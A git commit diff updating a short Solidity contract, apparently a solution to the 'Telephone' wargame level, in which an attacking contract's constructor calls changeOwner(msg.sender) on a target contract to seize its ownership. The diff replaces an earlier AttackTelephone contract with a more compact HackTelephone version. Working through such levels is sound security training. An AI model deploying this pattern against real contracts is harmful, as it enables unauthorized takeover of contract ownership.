d49a55d21bc70c9510dc5a08efac00cf3de5d8ef
kornelHub <67650984+kornelHub@users.noreply.github.com>
2023-03-02 11:33:32 +0100

    Update Telephone.sol

--- Telephone.sol
+++ Telephone.sol
@@ -1,18 +1,12 @@
 // SPDX-License-Identifier: MIT
-pragma solidity 0.8.9;
+pragma solidity 0.8.19;
 
-interface Telehpone {
+interface Telephone  {
     function changeOwner(address) external;
 }
 
-contract AttackTelephone {
-    Telehpone private telephoneContract;
-
-    constructor(address telephoneAddress) {
-        telephoneContract = Telehpone(telephoneAddress);
-    }
-
-    function attack() public {
-        telephoneContract.changeOwner(msg.sender);
+contract HackTelephone {
+    constructor(Telephone add) {
+        Telephone(add).changeOwner(msg.sender);
     }
 }
